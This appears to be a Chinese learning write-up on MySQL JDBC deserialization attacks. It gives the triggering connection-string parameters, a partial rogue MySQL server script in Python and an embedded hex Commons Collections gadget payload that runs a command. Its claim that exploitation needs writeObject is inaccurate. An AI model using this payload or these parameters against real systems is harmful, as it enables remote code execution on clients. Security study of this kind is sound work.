# JDBC反序列化入门学习

## 什么是JDBC？
JDBC (Java Database Connectivity) 是 Java 提供的一种用于执行 SQL 语句的 Java API。它允许 Java 程序与数据库进行交互，从而实现数据的存取、更新和查询等功能。

## 测试环境
- **IDE**: IntelliJ IDEA
- **数据库**: MySQL 5.7
- **JDBC 驱动**: 下载地址: [MySQL Connector/J](https://dev.mysql.com/downloads/connector/j/)
  - 建议下载版本 8.0.12 或其他稳定版本。
  - 将下载的驱动包引入到项目中作为模块库。

## 反序列化简单介绍
反序列化是将字节流转换回对象的过程。在 Java 中，反序列化漏洞通常涉及 `Serializable` 接口、`readObject()` 和 `writeObject()` 方法。要利用反序列化漏洞，需要满足以下三个条件：
1. 对象实现了 `Serializable` 接口。
2. 对象具有 `readObject()` 方法。
3. 对象具有 `writeObject()` 方法。

## 断点调试
为了更好地理解反序列化过程，可以在关键方法处设置断点进行调试。例如，在 `com.mysql.cj.jdbc.result.ResultSetImpl.getObject()` 方法中设置断点，并观察其调用链。

## 构造POC
### 连接字符串
要触发反序列化，需要在连接字符串中添加特定参数：
```java
queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```

### 数据包结构
`SHOW SESSION STATUS` 的响应包结构如下：
1. 数据段1：说明结果集有多少列。
2. 数据段2：列的定义。
3. 数据段3：EOF 包。
4. 数据段4：行数据。

### 示例代码
以下是构造 POC 的示例代码：

```python
# -*- coding:utf-8 -*-
#@Time : 2020/7/27 2:10
#@Author: Tri0mphe7
#@File : server.py

import socket
import binascii
import os

greeting_data = "4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"
response_ok_data = "0700000200000002000000"

def receive_data(conn):
    data = conn.recv(1024)
    print("[*] Receiving the package: {}".format(data))
    return str(data).lower()

def send_data(conn, data):
    print("[*] Sending the package: {}".format(data))
    conn.send(binascii.a2b_hex(data))

def get_payload_content():
    file = 'a'
    if os.path.isfile(file):
        with open(file, 'rb') as f:
            payload_content = str(binascii.b2a_hex(f.read()), encoding='utf-8')
        print("Open success")
    else:
        print("Open failed")
        # 示例 payload
        payload_content = 'aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'
    return payload_content

def run():
    # 主要逻辑
    pass
```

## 补充
- **参考资料**:
  - [JDBC基础介绍](https://www.runoob.com/java/java-mysql-connect.html)
  - [学习来源](https://xz.aliyun.com/t/8159)
  - [漫谈Java反序列化](https://github.com/SummerSec/JavaLearnVulnerability)

希望这些内容对你有所帮助！如果你有任何问题或需要进一步的帮助，请随时告诉我。